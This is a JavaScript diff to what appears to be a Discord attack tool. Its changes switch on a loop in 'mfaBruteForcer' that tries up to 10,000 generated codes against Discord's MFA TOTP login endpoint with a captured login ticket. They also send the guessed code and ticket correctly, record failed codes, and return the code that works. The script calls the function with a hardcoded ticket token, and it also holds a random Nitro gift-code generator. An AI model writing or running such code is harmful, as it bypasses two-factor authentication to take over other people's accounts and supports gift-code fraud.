@@ -91,7 +91,7 @@ return `${result}`;
 }
 async function mfaBruteForcer(token){
 let codes = 10000;
-//for (let i = 0; i < codes; i++){
+for (let i = 0; i < codes; i++){
 sleep(2000)
 let auth = mfaGenerator();
 fs.readFile("codes.txt", async function (err, data) {
@@ -99,6 +99,11 @@ fs.readFile("codes.txt", async function (err, data) {
   if(data.includes(`${auth}`)){
   console.log(`invalid code`)
 } else {
+  let content = `{
+    "code": "${auth}",
+    "ticket": "${token}",
+    "login_source":null,
+    "gift_code_sku_id":null}`
 let response = await fetch("https://discord.com/api/v9/auth/mfa/totp", {
   "headers": {
     "accept": "*/*",
@@ -118,7 +123,7 @@ let response = await fetch("https://discord.com/api/v9/auth/mfa/totp", {
   },
   "referrer": "https://discord.com/login",
   "referrerPolicy": "strict-origin-when-cross-origin",
-  "body": "{\"code\": auth,\"ticket\": token,\"login_source\":null,\"gift_code_sku_id\":null}",
+  "body": content,
   "method": "POST",
   "mode": "cors",
   "credentials": "include"
@@ -127,10 +132,10 @@ console.log(response.status)
 console.log(await response.json())
 if (response.status == 400){
 fs.writeFile('codes.txt', `${auth}\n`, { flag: 'a+' }, err => {})
-}
+} else if (response.status == 200) return `${GREEN}${auth}`;
 }
 });
-}
+}}
 function nitroGenerator(){
   const characters ='ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
   const length = 16;
@@ -252,6 +257,8 @@ rl.pause()
 return "command executed";
 }
 welcome();
+//console.log(moment)
+//console.log(JSON.stringify(moment))
 mfaBruteForcer(`WzU2MzQ3NzY0Njc3Njg2MDY3MiwibG9naW4iXQ.Yg6fLw.rETsY4NjX1lDk-04GwqqzbO8cJY`)
 main().then(console.log()).catch(console.err)
 rl.on('pause', () => {
